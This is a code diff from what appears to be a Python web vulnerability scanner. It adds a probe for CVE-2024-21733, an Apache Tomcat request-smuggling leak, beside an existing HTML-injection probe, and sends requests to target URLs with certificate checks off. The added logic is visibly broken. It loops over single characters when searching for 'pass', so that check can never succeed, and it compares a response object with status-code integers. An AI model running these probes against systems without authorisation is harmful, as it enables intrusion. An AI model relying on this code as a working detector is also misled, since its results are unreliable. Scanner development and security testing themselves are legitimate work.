@@ -1,6 +1,7 @@
 #! /usr/bin/env python3
 # -*- coding: utf-8 -*-
 
+import requests
 
 def apache(url, s):
     """
@@ -8,7 +9,32 @@ def apache(url, s):
         X-Forwarded-Server
         X-Real-IP
         Max-Forwards
+
+    https://hackerone.com/reports/2327341: CVE-2024-21733 Apache Tomcat HTTP Request Smuggling (Client- Side Desync) (CWE: 444)
     """
+    try:
+        #CVE-2024-21733
+        res_post_without_data = requests.post(url, verify=False, timeout=10)
+        res_post = requests.post(url, data="X", verify=False, timeout=10)
+
+        len_pwd = len(res_post_without_data.content)
+        len_p = len(res_post.content)
+
+        if len_p not in range(len_pwd - 50, len_pwd + 50) and res_post.status_code not in [404, 200, 403] and res_post.status_code != res_post_without_data.status_code and len_p != 0:
+            print(f"   └── [ND][{res_post_without_data.status_code}][{len_pwd}b] :: [X][{res_post.status_code}][{len_p}b] | {url}")
+        else:
+            for rp in res_post.text:
+                if "pass" in rp or "PASS" in rp:
+                    print(f"   └── CVE-2024-21733 seem's work on {url} :: {rp}")
+                else:
+                    pass
+    except requests.ConnectionError:
+        pass
+    except requests.Timeout:
+        pass
+    except Exception as e:
+        pass
+        #print(f"Error {url} : {str(e)}")
     uqe_url = '{}/?"><u>plop123</u>'.format(url)
     uqe_req = s.get(uqe_url, verify=False, timeout=6)
     if uqe_req not in [403, 401, 400, 500]:
